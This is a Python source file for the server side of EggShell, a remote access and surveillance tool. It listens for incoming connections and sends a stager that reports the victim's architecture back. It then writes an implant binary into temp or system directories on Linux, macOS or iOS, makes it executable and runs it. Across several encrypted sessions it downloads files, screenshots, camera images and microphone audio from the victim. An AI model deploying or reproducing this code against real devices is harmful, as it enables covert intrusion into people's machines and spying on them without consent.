#ESServer
#ESSession
#created by lucas.py
#3-5-17
import os
import socket
import sys
import time
from threading import Thread
from modules.encryption.ESEncryptor import ESEncryptor
from modules.shell.shell import ESShell
import random
import string
import json
import base64

datadir = "data"

class ESSession:
    def __init__(self,uid,name,conn,s,host,port,CDA):
        self.uid = uid
        self.name = name
        self.conn = conn
        self.s = s
        self.host = host
        self.port = port
        self.CDA = CDA

class ESServer:
    def __init__(self,escryptor,helper):
        self.sessions = {}
        self.escryptor = escryptor
        self.shell = ESShell()
        self.binaryKey = "spGHbigdxMBJpbOCAr3rnS3inCdYQyZV"
        self.h = helper
        self.inputhandle = ""
        self.msrunning = 0
        self.msescalate = 0
        self.lport = 4444
        self.lhost = ""
    
    def term(self):
        return ''.join((random.choice(string.letters)) for x in range(16))

    def listen(self,host,port,verbose):
        self.lport = port
        self.lhost = host
        host = socket.gethostbyname(host)
        term = self.term()
        
        #craft shell script
        INSTRUCT_ADDRESS = "/dev/tcp/"+str(host)+"/"+str(port)
        JSON_ARGS = json.dumps({"ip":host,"port":str(port),"key":self.escryptor.key,"term":term,"debug":1})
        ARGUMENT_LENGTH = str(len(JSON_ARGS))
        INSTRUCT_BINARY_ARGUMENT = ESEncryptor(self.binaryKey,16).encryptString(
            JSON_ARGS
        )
        INSTRUCT_STAGER = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'
        
        #listen for connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', int(port)))
        s.listen(1)
        if verbose:
            self.h.strinfo("Listening on port "+str(port)+"...")

        #SEND/RECEIVE ARCH
        conn, addr = s.accept()
        hostAddress = addr[0]
        if verbose:
            self.h.strinfo("Connecting to "+hostAddress)
        conn.send(INSTRUCT_STAGER)
        CDA = conn.recv(128)
        
        #CHOOSE/SEND BINARY
        payload = ""
        preload = ""
        if "armv7l" in CDA:
            CDA = "Linux"

        if "i386" in CDA:
            if verbose:
                self.h.strinfo("Detected OSX")
            binaryFile = open("src/resources/esplosx", "rb")
            payload = binaryFile.read()
            binaryFile.close()
            preload = "rm /private/tmp/espl 2> /dev/null;cat >/private/tmp/espl;chmod 777 /private/tmp/espl;/private/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" "+ARGUMENT_LENGTH+" 2> /dev/null &\n"
        elif "arm" in CDA:
            if verbose:
                self.h.strinfo("Detected iOS")
            binaryFile = open("src/resources/esplios", "rb")
            payload = binaryFile.read()
            binaryFile.close()
            #TODO: change upload directory for mobile user
            preload = "export dti='/tmp/'; if [ $UID == '0' ]; then export dti='/usr/bin/'; fi;rm $dti'espl' 2> /dev/null;cat >$dti'espl';chmod 777 $dti'espl';$dti'espl' "+INSTRUCT_BINARY_ARGUMENT+" "+ARGUMENT_LENGTH+" 2> /dev/null &\n"
        elif "Linux" in CDA:
            if verbose:
                self.h.strinfo("Detected Linux")
            binaryFile = open("src/resources/esplinux", "rb")
            payload = binaryFile.read()
            binaryFile.close()
            preload = "rm /var/tmp/espl;cat >/var/tmp/espl;chmod 777 /var/tmp/espl;/var/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" "+ARGUMENT_LENGTH+" &\n"
            print preload
        elif "GET / HTTP/1.1" in CDA:
            conn.close()
            print "EggShell does not exploit safari, it is a payload creation tool.\nPlease look at the README.md file"
            raw_input(self.h.strinfoGet("Press Enter To Continue"))
            return
        else:
            if verbose:
                self.h.strinfo("device unrecognized")
                print CDA
            conn.close()
            raw_input(self.h.strinfoGet("Press Enter To Continue"))
            return

        if verbose:
            self.h.strinfo("Sending Payload")
        conn.send(preload)
        conn.send(payload)
        conn.close() #only one blink!
        if verbose:
            self.h.strinfo("Waiting For Connection...")
        conn, hostAddress = s.accept()
        s.settimeout(5)
        data = self.receiveString(conn,term)
        if data:
            uid = data.split(" ")[0]
            data = data.replace(uid+" ","")
            name = self.h.UNDERLINE_GREEN + data.replace("\n","") + self.h.ENDC + self.h.GREEN + "> " + self.h.ENDC;
            #spawn our interactive shell
            s.close()
            return ESSession(uid,name,conn,s,host,port,CDA)
        else:
            self.h.strinfo("Unable to get computer name")
            raw_input(self.h.strinfoGet("Press Enter To Continue"))

    def getip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);s.connect(("192.168.1.1",80));host = s.getsockname()[0];s.close()
            host = host
        except:
            host = "127.0.0.1"
        return host

    def singleServer(self,host,port):
        session = self.listen(host,port,1)
    
        
        if session and self.shell.interact(session,self) == -1:
            self.h.strinfo("closing connection")
            session.conn.close
            time.sleep(0.5)
        else:
            self.h.strinfo("closing connection")
            time.sleep(1)

    def refreshSession(self,session):
        #if in multiserver, set escalation flag
        if self.msrunning:
            self.msescalate = 1
            #wait for escalate = 0
            while self.msescalate:
                time.sleep(0.1)
            return
        #if single session, just listen for a new session, replace connection/name
        newsession = self.listen(session.host,session.port,0)
        session.s = newsession.s
        session.conn = newsession.conn
        session.name = newsession.name


    #MARK: Multiserver
    def multiServerListen(self,host,port):
        x = 1
        self.h.strinfo("Starting Background Multi Server on "+str(port)+"...")
        self.h.strinfo("type \"help\" for MultiServer commands")
        while self.msrunning:
            session = self.listen(host,port,0)
            skip = 0
            for sx in self.sessions:
                if session.uid == self.sessions[sx].uid:
                    if self.msescalate:
                        self.sessions[sx].s = session.s
                        self.sessions[sx].conn = session.conn
                        self.sessions[sx].name = session.name
                        self.msescalate = 0
                        skip = 1
                    else:
                        session.conn.close()
                        skip = 1
                        break
            #damnit
            if skip:
                continue
            #add to sessions
            self.sessions[x] = session
            try:
                session.conn.getpeername()[0]
            except:
                del self.sessions[x]
                continue

            sys.stdout.write("\n\r"+self.h.COLOR_INFO+"[*]  "+
             self.h.WHITE+"Session "+str(x)+" opened | "+
             self.sessions[x].name.replace(self.h.UNDERLINE_GREEN,"").replace(self.h.GREEN,"")[:-10] + " "+
             self.sessions[x].conn.getpeername()[0]+
             self.h.WHITE+"\n"+
             self.inputhandle)

            sys.stdout.flush()
            x += 1

    def multiServer(self,host,port):
        self.msrunning = 1;
        bgserver = Thread(target = self.multiServerListen, args=(host,port))
        bgserver.daemon=True
        bgserver.start()
        time.sleep(0.01)
        while 1:
            self.inputhandle = self.h.COLOR_INFO+"MultiSession"+self.h.WHITE+"> "
            input = raw_input(self.inputhandle)
            if not input:
                continue
            cmd = input.split()
            #commands
            try:
                if cmd[0] == "interact":
                    self.multiServerInteract(cmd)
                elif cmd[0] == "sessions":
                    self.multiServerListSessions()
                elif cmd[0] == "close":
                    self.multiServerCloseSession(cmd)
                elif cmd[0] == "help":
                    self.multiServerHelp()
                elif cmd[0] == "exit":
                    self.multiServerExit(bgserver)
                    self.msrunning = 0
                    print "exit!"
                    break
                else:
                    print "invalid command"
            except Exception as e:
                print str(e)+"\n"
                continue
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect( (host,port))
        bgserver.join()

    def multiServerExit(self,bgserver):
        #clean up
        for key,value in self.sessions.iteritems():
            if value.name:
                try:
                    s = self.sessions[key]
                    s.conn.close()
                except:
                    pass
        self.sessions.clear()

    def multiServerListSessions(self):
        self.h.strinfo("Total Sessions: " + str(len(self.sessions)))
        for key,value in self.sessions.iteritems():
            self.h.strinfo("Session ["+str(key)+"] | "+value.name.replace(self.h.UNDERLINE_GREEN,"").replace(self.h.GREEN,"")[:-10]+" "+value.conn.getpeername()[0])

    def multiServerHelp(self):
        def showCommand(cmd,desc):
            print cmd + " " * (15 - len(cmd)) + ": " + desc
        print self.h.WHITEBU+"MultiSession Commands:"+"\n"+self.h.ENDC
        showCommand("interact","interact with session, Usage: interact (session number)")
        showCommand("close","close session, Usage: close (session number)")
        showCommand("sessions","list current active sessions")
        showCommand("exit","exit MultiServer")
        print ""

    def multiServerInteract(self,args):
        try:
            s = self.sessions[int(args[1])]
            self.inputhandle = s.name
            s.conn.getpeername()[0]
            if self.shell.interact(s,self,1) == -1:
                self.multiServerCloseSession(args) #2nd arg is id
        except:
            self.h.strinfo("unable to interact with session")

    def multiServerCloseSession(self,args):
        if len(args) > 1:
            x = int(args[1])
            try:
                s = self.sessions[x]
                s.conn.close()
                del self.sessions[x]
                self.h.strinfo("Session "+str(x)+" closed")
            except:
                self.h.strinfo("Session not found")
        else:
            self.h.strinfo("Please specify a session id")


    def packcommand(self,cmd,args,type,term):
        #json encode and encrypt
        data = json.dumps({"cmd":cmd,
                          "args":args,
                          "term":term,
                          "type":type})
        return self.escryptor.encryptString(data)

    def sendCommand(self,cmd,args,type,conn):
        #create terminator for reply data and send data
        terminator = self.term()
        conn.send(self.packcommand(cmd,args,type,terminator))
        #receive response
        try:
            #downloads are called from sendCommand
            if type == "download":
                self.downloadFile(cmd+" "+args,terminator,conn)
            else:
                rdata = self.receiveString(conn,terminator)
                if rdata != "":
                    return rdata.rstrip("\n")
        except Exception as e:
            print e
        return ""

    def receiveString(self,conn,terminator):
        #live terminator is just terminator reversed
        liveterminator = terminator[::-1]
        data = ""
        islivestream = 0;
        while 1:
            try:
                data += conn.recv(1024)
                if not data:
                    print "Something went wrong"
                    return
                #terminator when we are done receiving data
                if terminator in data:
                    if islivestream:
                        return ""
                    data = data.split(terminator)[0]
                    try:
                        result = self.escryptor.decrypt(data)
                        if result == "-1":
                            result = "invalid command"
                        return result
                    except Exception as e:
                        print terminator
                        print data
                        return str(e)
                elif liveterminator in data:
                        islivestream = 1
                        #split from live terminator
                        splitdata = data.split(liveterminator)
                        #decrypt data before last self.liveterminator
                        try:
                            tmpdata = self.escryptor.decrypt(splitdata[len(splitdata) - 2])
                            if tmpdata:
                                print tmpdata.rstrip("\n")
                        except Exception as e:
                            print splitdata[len(splitdata) - 2] + " " + str(e)
            #if we are live send kill task
            except KeyboardInterrupt:
                print ""
                conn.send(self.packcommand("endtask","","",terminator))


    def uploadFile(self,fileName,uploadPath,conn):
        terminator = self.term()
        #get file data
        if os.path.exists(fileName) == False:
            self.h.strinfo(fileName + " not found")
            return
        f = open(fileName,"rb")
        fileData = f.read()
        f.close()
        #TODO: encrypt the data
        fileData = self.escryptor.encode(fileData)
        #get file size
        sizeofFile = sys.getsizeof(fileData)
        #send data
        data = json.dumps({"cmd":"upload",
                          "args":uploadPath,
                          "term":terminator,
                          "type":"upload",
                      "filesize":len(fileData)})
        conn.send(self.escryptor.encryptString(data))
        #receive go ahead
        conn.recv(256)
        self.h.strinfo("Uploading "+fileName)
        #send
        progress = 0
        while progress < len(fileData):
            conn.send(fileData[progress:progress + 1024])
            progress += 1024
        conn.send(terminator)
        #receive confirmation
        conn.recv(256)

    def downloadFile(self,cmdraw,terminator,conn):
        #receive size of file
        sizedata = ""
        while 1:
            sizedata += conn.recv(2)
            if terminator in sizedata:
                break
        sof = self.escryptor.decrypt(sizedata.split(terminator)[0])
        #detect if result is an error
        try:
            sizeofFile = int(sof)
        except:
            self.h.strinfo("Error: "+sof)
            return
        self.h.strinfo("file size: "+str(sizeofFile))
        #filename to write to
        if not os.path.exists(datadir):
            os.makedirs(datadir)
        
        #split original command
        args = cmdraw.split()
        
        fileName = ""
        dateFormat = "%Y%m%d%H%M%S"
        if args[0] == "screenshot":
            fileName = "screenshot"+time.strftime(dateFormat)+".jpeg"
        elif args[0] == "picture":
            fileName = "isight"+time.strftime(dateFormat)+".jpeg"
        elif args[0] == "frontcam":
            fileName = "frontcamera"+time.strftime(dateFormat)+".jpeg"
        elif cmdraw == "backcam":
            fileName = "backcamera"+time.strftime(dateFormat)+".jpeg"
        #TODO: fix this
        elif cmdraw == "download /tmp/.avatmp":
            fileName = "mic"+time.strftime(dateFormat)+".aac"
        else:
            fileName = args[1].split("/")[-1]

        progress = 0
        file = open(os.getcwd()+"/.tmpfile", "a+b")
        #last chunk, lets us combine to see if our terminator was sent
        lastchunk = ""
        while 1:
            chunk = conn.recv(2048)
            progress += len(chunk)
            if progress > sizeofFile:
                progress = sizeofFile
            sys.stdout.write("\r"+self.h.strinfoGet(self.h.WHITE+"Downloading "+fileName+" ("+str(progress)+"/"+str(sizeofFile)+") bytes"))
            if terminator in lastchunk + chunk:
                print ""
                #todo: this could fail, fix
                chunk = chunk.split(terminator)[0]
                file.write(chunk)
                file.close()
                #decrypt with our shell key, remove tmp file
                downloadedFile = open("data/"+fileName,"wb")
                downloadedFile.close()
                try:
                    self.escryptor.decryptFile(os.getcwd()+"/.tmpfile", "data/"+fileName, sizeofFile)
                except Exception as e:
                    print str(e)+"\n"
                
                os.remove(os.getcwd()+"/.tmpfile")
                self.h.strinfo("Finished Downloading!")
                return
            else:
                lastchunk = chunk
                file.write(chunk)
